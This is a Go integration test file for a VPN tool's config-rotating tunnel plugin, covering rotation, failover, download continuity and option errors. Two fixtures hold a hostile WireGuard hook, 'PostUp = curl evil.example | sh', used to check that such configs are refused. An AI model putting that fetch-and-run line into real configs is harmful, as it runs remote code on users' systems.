// Copyright VPNW.com 2026
// SPDX-License-Identifier: Apache-2.0

package integration

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/VPNWorks/vpnw/internal/path/wgtest"
)

// Tunnel plugins: the real vpnw, with the built-in rotate plugin handing it
// the WireGuard configs in a folder, to real test peers in this process.
// Each peer says its name in its answers, so a test can tell which tunnel
// carried a request.
//
// Set VPNW_TUNNEL_OUT to a file to get the results as a Markdown table.

var (
	tunMu   sync.Mutex
	tunRows []string
	tunSeen = map[string]int{}
)

func tunRecord(t *testing.T, check, want, got string, ok bool) {
	res := "passed"
	if !ok {
		res = "FAILED"
	}
	tunMu.Lock()
	tunRows = append(tunRows, fmt.Sprintf("| %s | %s | %s | %s |", check, want, got, res))
	tunSeen[t.Name()]++
	tunMu.Unlock()
}

// tunGuard gives a test that stops before its check a FAILED row.
func tunGuard(t *testing.T) {
	t.Cleanup(func() {
		tunMu.Lock()
		defer tunMu.Unlock()
		if t.Failed() && tunSeen[t.Name()] == 0 {
			tunRows = append(tunRows, fmt.Sprintf("| %s | (see the test) | stopped before its check | FAILED |", t.Name()))
		}
	})
}

func tunWrite() {
	fn := os.Getenv("VPNW_TUNNEL_OUT")
	if fn == "" {
		return
	}
	tunMu.Lock()
	defer tunMu.Unlock()
	os.WriteFile(fn, []byte("| Check | What must happen | What happened | Result |\n|---|---|---|---|\n"+strings.Join(tunRows, "\n")+"\n"), 0o644)
}

func namedPeer(t *testing.T, name string) *wgtest.Server {
	t.Helper()
	s, err := wgtest.StartNamed(name)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(s.Close)
	return s
}

// configs writes a folder of configs and returns the options that hand it
// to the rotate plugin.
func configs(t *testing.T, e *env, files map[string]string) (string, []string) {
	t.Helper()
	dir := filepath.Join(e.dir, "configs")
	if err := os.MkdirAll(dir, 0o700); err != nil {
		t.Fatal(err)
	}
	for name, body := range files {
		writeFile(t, dir, name, body)
	}
	return dir, []string{"--tunnel", "rotate", "--plugin-folder", "rotate=" + dir}
}

// peerLoop asks the web server in the tunnel for its page every 200 ms, for
// secs seconds, and prints one line per try: OK with the second it started
// and the peer that answered, or FAIL with the reason.
func peerLoop(secs float64) string {
	return fmt.Sprintf(`import urllib.request as u, time, sys
t0 = time.time()
while time.time() - t0 < %g:
    s = time.time() - t0
    try:
        b = u.urlopen('http://web.tunnel.test/', timeout=3).read().decode()
        sys.stdout.write('OK %%.1f %%s\n' %% (s, b.split()[-1]))
    except Exception as e:
        sys.stdout.write('FAIL %%.1f %%s\n' %% (s, type(e).__name__))
    sys.stdout.flush()
    time.sleep(0.2)
`, secs)
}

// answers reads peerLoop's lines: the peers that answered, in order, and
// how many tries failed.
func answers(out string) (peers []string, fails int) {
	for _, l := range strings.Split(out, "\n") {
		f := strings.Fields(l)
		switch {
		case len(f) == 3 && f[0] == "OK":
			peers = append(peers, f[2])
		case len(f) >= 1 && f[0] == "FAIL":
			fails++
		}
	}
	return peers, fails
}

// runs squeezes a sequence of peers into its runs: A A B B A -> A B A.
func runs(seq []string) []string {
	var out []string
	for _, s := range seq {
		if len(out) == 0 || out[len(out)-1] != s {
			out = append(out, s)
		}
	}
	return out
}

// tunnelEvents reads the tunnel events of a trace, and the config of each
// connection opened, in order.
func tunnelEvents(t *testing.T, fn string) (start map[string]any, switches []map[string]any, errs []string, closes []string, opened []string) {
	t.Helper()
	for _, ev := range readTrace(t, fn) {
		f, _ := ev["fields"].(map[string]any)
		switch ev["type"] {
		case "run.start":
			start, _ = f["tunnel"].(map[string]any)
		case "tunnel.switch":
			switches = append(switches, f)
		case "tunnel.error":
			e := fmt.Sprint(f["error"])
			if c, ok := f["config"].(string); ok {
				e = c + ": " + e
			}
			errs = append(errs, e)
		case "tunnel.close":
			closes = append(closes, fmt.Sprint(f["config"]))
		case "connection.open":
			opened = append(opened, fmt.Sprint(f["tunnel"]))
		}
	}
	return
}

// Configs vpnw refuses, or whose tunnel doesn't come up, are skipped at the
// start: the run starts on the first that works, and the record says why
// each other one was skipped.
func TestTunnelStartSkipsBadConfigs(t *testing.T) {
	skipIfNoSeal(t)
	tunGuard(t)
	a := namedPeer(t, "A")
	e := newEnv(t)
	_, args := configs(t, e, map[string]string{
		"1-hook.conf":     a.ClientConfig() + "PostUp = curl evil.example | sh\n",
		"2-openvpn.conf":  "client\ndev tun\nremote vpn.example.com 1194\n",
		"3-stranger.conf": a.StrangerConfig(),
		"4-a.conf":        a.ClientConfig(),
		"notes.txt":       "not a config",
	})
	tr := filepath.Join(e.dir, "run.jsonl")
	out, code := e.run(append(append([]string{"trace"}, args...), "--out", tr, "--", "python3", "-c", pyGet("http://web.tunnel.test/"))...)
	start, _, _, _, opened := tunnelEvents(t, tr)
	skipped := fmt.Sprint(start["skipped"])
	ok := code == 0 && strings.Contains(out, "GOT http://web.tunnel.test/") && start["config"] == "4-a.conf" &&
		strings.Contains(skipped, "1-hook.conf") && strings.Contains(skipped, "shell hook") &&
		strings.Contains(skipped, "2-openvpn.conf") && strings.Contains(skipped, "3-stranger.conf") && strings.Contains(skipped, "no WireGuard handshake") &&
		len(opened) == 1 && opened[0] == "4-a.conf" && !strings.Contains(skipped, "notes.txt")
	for _, want := range []string{"tunnel 4-a.conf from rotate", "skipped 1-hook.conf: line", "skipped 2-openvpn.conf:", "skipped 3-stranger.conf: no WireGuard handshake", "via rotate (4-a.conf, exit 127.0.0.1:"} {
		if !strings.Contains(out, want) {
			ok = false
			t.Errorf("console lacks %q", want)
		}
	}
	tunRecord(t, "a folder with a config that runs a shell hook, an OpenVPN file, a config whose peer doesn't know its key, and a good one",
		"the run starts on the good one; the record says why each other was skipped",
		fmt.Sprintf("exit %d; in use: %v; skipped: %d, each with its reason; the request went through %v", code, start["config"], len(start["skipped"].([]any)), opened), ok)
	if !ok {
		t.Fatalf("exit %d\n%s", code, out)
	}
	t.Logf("\n%s", out)
}

// When no config comes up, the program never starts (exit 123), and vpnw
// says why; vpnw never falls back to connecting directly.
func TestTunnelNothingComesUp(t *testing.T) {
	skipIfNoSeal(t)
	tunGuard(t)
	a := namedPeer(t, "A")
	e := newEnv(t)
	dir, args := configs(t, e, map[string]string{
		"hook.conf":    a.ClientConfig() + "PostUp = curl evil.example | sh\n",
		"openvpn.conf": "client\ndev tun\n",
	})
	marker := filepath.Join(e.dir, "ran")
	out, code := e.run(append(append([]string{"run"}, args...), "--", "touch", marker)...)
	_, err := os.Stat(marker)
	ok := code == 123 && err != nil && strings.Contains(out, "no config from tunnel plugin rotate came up") &&
		strings.Contains(out, "hook.conf: line") && strings.Contains(out, "openvpn.conf:") && strings.Contains(out, "came round to hook.conf again")
	tunRecord(t, "every config in the folder is refused", "the program never starts (exit 123), and vpnw says why for each",
		fmt.Sprintf("exit %d, program started: %v", code, err == nil), ok)
	if !ok {
		t.Fatalf("exit %d\n%s", code, out)
	}

	for _, f := range []string{"hook.conf", "openvpn.conf"} {
		os.Remove(filepath.Join(dir, f))
	}
	out, code = e.run(append(append([]string{"run"}, args...), "--", "touch", marker)...)
	_, err = os.Stat(marker)
	ok = code == 123 && err != nil && strings.Contains(out, "the plugin has no config: no .conf files in "+dir)
	tunRecord(t, "an empty folder", "the program never starts (exit 123), and vpnw says the folder has no configs",
		fmt.Sprintf("exit %d, program started: %v", code, err == nil), ok)
	if !ok {
		t.Fatalf("exit %d\n%s", code, out)
	}

	// The default folder, ~/.config/vpnw/rotate, doesn't exist yet.
	out, code = e.run("run", "--tunnel", "rotate", "--", "touch", marker)
	ok = code == 121 && strings.Contains(out, "doesn't exist; make it, or give another with --plugin-folder rotate=PATH")
	tunRecord(t, "no folder given, and the default one isn't there", "refused before anything starts (exit 121), saying which folder it looked for",
		fmt.Sprintf("exit %d", code), ok)
	if !ok {
		t.Fatalf("exit %d\n%s", code, out)
	}
	// It is used once it does.
	conf := filepath.Join(e.dir, "config", "vpnw", "rotate")
	os.MkdirAll(conf, 0o700)
	writeFile(t, conf, "a.conf", a.ClientConfig())
	if out, code := e.run("run", "--tunnel", "rotate", "--", "python3", "-c", pyGet("http://web.tunnel.test/")); code != 0 || !strings.Contains(out, "GOT") {
		t.Errorf("the default folder: exit %d\n%s", code, out)
	}
}

// Rotation every 5 seconds through three peers: requests keep working
// across every switch, each goes through the tunnel the record says, and
// the rotation comes round again.
func TestTunnelRotation(t *testing.T) {
	skipIfNoSeal(t)
	tunGuard(t)
	a, b, c := namedPeer(t, "A"), namedPeer(t, "B"), namedPeer(t, "C")
	e := newEnv(t)
	_, args := configs(t, e, map[string]string{"a.conf": a.ClientConfig(), "b.conf": b.ClientConfig(), "c.conf": c.ClientConfig()})
	tr := filepath.Join(e.dir, "run.jsonl")
	out, code := e.run(append(append([]string{"run"}, args...), "--set", "rotate.every=5s", "--out", tr, "--", "python3", "-c", peerLoop(21))...)
	peers, fails := answers(out)
	start, switches, errs, _, opened := tunnelEvents(t, tr)
	open := unsettled(t, tr)
	order := runs(peers)
	var whys []string
	for _, s := range switches {
		whys = append(whys, fmt.Sprintf("%v→%v (%v)", s["from"], s["to"], s["why"]))
	}
	// Each request's connection went through the config of the peer that
	// answered it.
	match := len(opened) == len(peers)
	for i := 0; match && i < len(peers); i++ {
		match = opened[i] == strings.ToLower(peers[i])+".conf"
	}
	served := a.Requests.Load() + b.Requests.Load() + c.Requests.Load()
	ok := code == 0 && fails == 0 && len(peers) > 40 && len(order) >= 4 && strings.Join(order[:4], "") == "ABCA" && match &&
		len(switches) >= 3 && len(errs) == 0 && len(open) == 0 && start["keep"] == float64(5) && served == int64(len(peers))
	tunRecord(t, "rotate.every=5s through three peers while the program asks for a page every 200 ms, for 21 seconds",
		"every request works; the tunnel moves A, B, C, A; each connection goes through the config the record names",
		fmt.Sprintf("%d requests, %d failed; peers in turn: %s; switches: %s; record and answers agree: %v; %s", len(peers), fails, strings.Join(order, " "), strings.Join(whys, ", "), match, settled(open)), ok)
	if !ok {
		b, _ := os.ReadFile(tr)
		t.Fatalf("exit %d, peers %v, fails %d, switches %v, errors %v, opened %v, served %d\n%s\n%s", code, order, fails, whys, errs, opened, served, out, b)
	}
}

// A download still going when the path rotates finishes through the
// tunnel it started on, while new requests go through the next one; the
// old tunnel closes after the download.
func TestTunnelRotationKeepsDownloads(t *testing.T) {
	skipIfNoSeal(t)
	tunGuard(t)
	a, b := namedPeer(t, "A"), namedPeer(t, "B")
	relay, err := wgtest.NewRelay(a.Port)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(relay.Close)
	relay.Delay(2 * time.Millisecond) // slow enough to last past a rotation
	e := newEnv(t)
	_, args := configs(t, e, map[string]string{"a.conf": a.ConfigVia(relay), "b.conf": b.ClientConfig()})
	tr := filepath.Join(e.dir, "run.jsonl")
	prog := `import urllib.request as u, threading, time, sys
def big():
    r = u.urlopen('http://web.tunnel.test/big', timeout=20)
    got = 0
    t0 = time.time()
    while True:
        x = r.read(65536)
        if not x: break
        got += len(x)
    sys.stdout.write('DONE %d %.1f\n' % (got, time.time() - t0)); sys.stdout.flush()
th = threading.Thread(target=big); th.start()
time.sleep(1)
for i in range(12):
    try:
        b = u.urlopen('http://web.tunnel.test/', timeout=3).read().decode()
        sys.stdout.write('OK %d %s\n' % (i, b.split()[-1]))
    except Exception as e:
        sys.stdout.write('FAIL %d %s\n' % (i, type(e).__name__))
    sys.stdout.flush()
    time.sleep(0.5)
th.join()
time.sleep(2.5)
`
	out, code := e.run(append(append([]string{"run"}, args...), "--set", "rotate.every=5s", "--out", tr, "--", "python3", "-c", prog)...)
	_, switches, _, closes, opened := tunnelEvents(t, tr)
	var done, secs float64
	for _, l := range strings.Split(out, "\n") {
		fmt.Sscanf(l, "DONE %f %f", &done, &secs)
	}
	peers, fails := answers(out)
	order := runs(peers)
	// The download's connection is the first opened, through a.conf; its
	// close comes before a.conf's tunnel closes.
	var closedAt, tunnelClosedAt int
	for i, ev := range readTrace(t, tr) {
		f, _ := ev["fields"].(map[string]any)
		if ev["type"] == "connection.close" && f["bytes_down"].(float64) >= wgtest.BigSize {
			closedAt = i
		}
		if ev["type"] == "tunnel.close" && f["config"] == "a.conf" {
			tunnelClosedAt = i
		}
	}
	ok := code == 0 && done == wgtest.BigSize && secs > 5 && len(switches) >= 1 && len(opened) > 0 && opened[0] == "a.conf" &&
		fails == 0 && len(order) >= 2 && order[0] == "A" && order[1] == "B" && tunnelClosedAt > closedAt && closedAt > 0
	tunRecord(t, "a 16 MB download through a slow tunnel when the path rotates (every 5 s)",
		"the download finishes through the tunnel it started on; new requests go through the next one; the old tunnel closes after the download",
		fmt.Sprintf("download: %.0f bytes in %.1f s through %s; requests: %d, %d failed, peers in turn %s; a.conf's tunnel closed after the download: %v", done, secs, opened[0], len(peers), fails, strings.Join(order, " "), tunnelClosedAt > closedAt), ok)
	if !ok {
		b, _ := os.ReadFile(tr)
		t.Fatalf("exit %d, done %v in %v s, switches %v, closes %v, opened %v, order %v, fails %d\n%s\n%s", code, done, secs, switches, closes, opened, order, fails, out, b)
	}
}

// The peer in use goes silent: vpnw notices on its own, moves to the next
// config, and requests work again; none reaches the silent peer after.
func TestTunnelFailover(t *testing.T) {
	skipIfNoSeal(t)
	tunGuard(t)
	a, b := namedPeer(t, "A"), namedPeer(t, "B")
	relay, err := wgtest.NewRelay(a.Port)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(relay.Close)
	e := newEnv(t)
	_, args := configs(t, e, map[string]string{"a.conf": a.ConfigVia(relay), "b.conf": b.ClientConfig()})
	tr := filepath.Join(e.dir, "run.jsonl")
	p := e.start(append(append([]string{"guard", "--allow", "web.tunnel.test"}, args...), "--out", tr, "--", "python3", "-c", peerLoop(40))...)
	p.waitFor(t, "OK", 3, 20*time.Second)
	relay.Silence(true)
	silenced := time.Now()
	time.Sleep(300 * time.Millisecond)
	beforeA := a.Requests.Load()
	code := p.wait(t, 60*time.Second)
	out := p.output()
	peers, fails := answers(out)
	order := runs(peers)
	_, switches, _, _, _ := tunnelEvents(t, tr)
	open := unsettled(t, tr)
	// When requests worked again: the first OK from B, counted from the
	// silence, on the program's own clock.
	var firstFail, firstB float64 = -1, -1
	for _, l := range strings.Split(out, "\n") {
		var s float64
		var who string
		if n, _ := fmt.Sscanf(l, "FAIL %f %s", &s, &who); n == 2 && firstFail < 0 {
			firstFail = s
		}
		if n, _ := fmt.Sscanf(l, "OK %f %s", &s, &who); n == 2 && who == "B" && firstB < 0 {
			firstB = s
		}
	}
	gap := firstB - firstFail
	var sw map[string]any
	if len(switches) > 0 {
		sw = switches[0]
	}
	ok := code == 0 && len(order) == 2 && order[0] == "A" && order[1] == "B" && a.Requests.Load() == beforeA && len(switches) == 1 &&
		sw["why"] == "failed" && sw["from"] == "a.conf" && sw["to"] == "b.conf" && strings.Contains(fmt.Sprint(sw["error"]), "nothing came back through it") &&
		fails > 0 && gap > 0 && gap < 30 && len(open) == 0
	tunRecord(t, "the peer in use goes silent in the middle of a run, with a second config in the folder",
		"vpnw notices on its own and moves to the next config; requests fail only in between; none reaches the silent peer after",
		fmt.Sprintf("requests failed for %.0f s, then worked through B; peers in turn %s; %d failed in all; the record: %v → %v, %q; %d requests reached A after; %s",
			gap, strings.Join(order, " "), fails, sw["from"], sw["to"], sw["error"], a.Requests.Load()-beforeA, settled(open)), ok)
	if !ok {
		b, _ := os.ReadFile(tr)
		t.Fatalf("exit %d after %v, order %v, switches %v, gap %.1f\n%s\n%s", code, time.Since(silenced), order, switches, gap, out, b)
	}
	t.Logf("\n%s", out)
	if os.Getenv("VPNW_DEBUG_TRACE") != "" {
		b, _ := os.ReadFile(tr)
		t.Logf("trace:\n%s", b)
	}
}

// A tunnel plugin that fails: at the start the program never runs; in the
// middle of a run the tunnel in use carries on, rotation stops, and the
// record says so.
func TestTunnelPluginFails(t *testing.T) {
	skipIfNoSeal(t)
	tunGuard(t)
	a, b := namedPeer(t, "A"), namedPeer(t, "B")
	e := newEnv(t)
	e.must("plugin", "add", "--allow-unsigned", testPlugin(t, "tunneler"))
	dir, _ := configs(t, e, map[string]string{"a.conf": a.ClientConfig(), "b.conf": b.ClientConfig()})
	args := []string{"--tunnel", "tunneler", "--plugin-folder", "tunneler=" + dir}

	marker := filepath.Join(e.dir, "ran")
	out, code := e.run(append(append([]string{"run"}, args...), "--set", "tunneler.mode=panic", "--", "touch", marker)...)
	_, err := os.Stat(marker)
	ok := code == 123 && err != nil && strings.Contains(out, "tunnel plugin tunneler stopped: panic: tunneler exploded")
	tunRecord(t, "the tunnel plugin panics when the run starts", "the program never starts (exit 123), and vpnw says why",
		fmt.Sprintf("exit %d, program started: %v", code, err == nil), ok)
	if !ok {
		t.Fatalf("exit %d\n%s", code, out)
	}

	tr := filepath.Join(e.dir, "later.jsonl")
	out, code = e.run(append(append([]string{"run"}, args...), "--set", "tunneler.mode=later", "--set", "tunneler.keep=5", "--out", tr, "--", "python3", "-c", peerLoop(10))...)
	peers, fails := answers(out)
	_, switches, errs, _, _ := tunnelEvents(t, tr)
	var pluginErr bool
	for _, ev := range readTrace(t, tr) {
		if ev["type"] == "plugin.error" && strings.Contains(fmt.Sprint(ev["fields"]), "tunneler exploded later") {
			pluginErr = true
		}
	}
	ok = code == 0 && fails == 0 && len(peers) > 20 && strings.Join(runs(peers), "") == "A" && len(switches) == 0 && pluginErr &&
		len(errs) == 1 && strings.Contains(errs[0], "tunnel plugin tunneler stopped") && strings.Contains(errs[0], "a.conf stays in use") &&
		strings.Contains(out, "tunnel plugin tunneler stopped")
	tunRecord(t, "the tunnel plugin panics when asked to rotate, 5 s into the run", "the tunnel in use carries on and no request fails; the record has the plugin's failure",
		fmt.Sprintf("%d requests, %d failed, all through %s; plugin.error recorded: %v; %v", len(peers), fails, strings.Join(runs(peers), ""), pluginErr, errs), ok)
	if !ok {
		b, _ := os.ReadFile(tr)
		t.Fatalf("exit %d\n%s\n%s", code, out, b)
	}
}

// Options that don't fit together are refused before anything starts.
func TestTunnelOptions(t *testing.T) {
	skipIfNoSeal(t)
	e := newEnv(t)
	a := namedPeer(t, "A")
	dir, _ := configs(t, e, map[string]string{"a.conf": a.ClientConfig()})
	for _, c := range []struct {
		args []string
		want string
	}{
		{[]string{"run", "--tunnel", "trace", "--", "true"}, "trace is an observer plugin; --tunnel takes a tunnel plugin"},
		{[]string{"run", "--plugin", "rotate", "--", "true"}, "rotate is a tunnel plugin; use it as the path, with --tunnel rotate"},
		{[]string{"run", "--tunnel", "rotate", "--plugin-folder", "rotate=" + dir, "--plugin", "rotate", "--", "true"}, "rotate is a tunnel plugin and already the path"},
		{[]string{"run", "--tunnel", "rotate", "--wireguard", "x.conf", "--", "true"}, "choose one of --direct, --proxy, --wireguard, --tunnel and --via"},
		{[]string{"run", "--plugin-folder", "rotate=" + dir, "--", "true"}, "--plugin-folder rotate=…: plugin rotate is not used in this run"},
		{[]string{"run", "--tunnel", "rotate", "--plugin-folder", "rotate=" + dir, "--plugin-folder", "trace=" + dir, "-v", "--", "true"}, "plugin trace doesn't ask for a folder"},
		{[]string{"run", "--tunnel", "rotate", "--plugin-folder", "rotate=" + dir, "--dns", "remote", "--", "true"}, "--dns with --tunnel is tunnel or local"},
		{[]string{"run", "--tunnel", "rotate", "--plugin-folder", "rotate=" + dir, "--set", "rotate.every=1s", "--", "true"}, "every must be a duration from 5s"},
		{[]string{"run", "--tunnel", "rotate", "--plugin-folder", "rotate=/no/such/folder", "--", "true"}, "plugin rotate's folder:"},
	} {
		out, code := e.run(c.args...)
		if code != 121 || !strings.Contains(out, c.want) {
			t.Errorf("%s: exit %d\n%s", strings.Join(c.args, " "), code, out)
		}
	}
	if out := e.must("plugin", "info", "rotate"); !strings.Contains(out, "tunnel") || !strings.Contains(out, "folder.read") {
		t.Errorf("plugin info rotate:\n%s", out)
	}
}
